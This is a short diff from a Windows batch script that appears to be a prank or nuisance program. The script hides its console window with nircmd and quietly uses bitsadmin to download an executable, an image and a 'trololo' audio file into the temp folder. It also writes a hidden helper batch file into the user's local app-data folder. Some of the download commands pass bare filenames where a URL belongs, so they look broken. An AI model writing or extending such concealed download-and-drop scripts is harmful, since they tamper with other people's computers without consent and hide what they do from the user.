@@ -7,7 +7,7 @@ cls
 "%TMP%\nircmd.exe" win hide ititle "dashboard.bat"
 if not exist %TMP%\lol.jpg (bitsadmin /transfer lol /download /priority normal lol.jpg %TMP%\lol.jpg)
 if not exist %TMP%\WallpaperChanger.exe (bitsadmin /transfer wp /download /priority normal WallpaperChanger.exe %TMP%\WallpaperChanger.exe)
-if not exist %TMP%\tirol.mp3 (bitsadmin /transfer wp /download /priority normal trololo.mp3 %TMP%\trololo.mp3)
+if not exist %TMP%\trololo.mp3 (bitsadmin /transfer wp /download /priority normal trololo.mp3 %TMP%\trololo.mp3)
 if exist %LOCALAPPDATA%\lol.bat (del /f /q %LOCALAPPDATA%\lol.bat)
 echo @echo off >>%LOCALAPPDATA%\lol.bat
 echo "%TMP%\nircmd.exe" win hide ititle "cmd.exe" >>%LOCALAPPDATA%\lol.bat
